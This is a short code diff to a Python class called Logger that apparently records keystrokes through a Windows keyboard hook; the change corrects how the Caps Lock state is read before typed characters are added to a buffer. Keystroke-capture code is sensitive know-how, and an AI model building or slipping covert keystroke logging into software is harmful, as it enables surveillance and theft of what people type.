@@ -103,7 +103,7 @@ class Logger:
                     return True
 
                 # ALL UPPERCASE LETTERS
-                elif GetKeyState(HookConstants.VKeyToID('VK_CAPITAL')):
+                elif GetKeyState(HookConstants.VKeyToID('VK_CAPITAL')) & 1:
                     if GetKeyState(HookConstants.VKeyToID('VK_LSHIFT')) or GetKeyState(HookConstants.VKeyToID('VK_RSHIFT')):
                         if self.paused:
                             self.buffer += chr(event.Ascii)
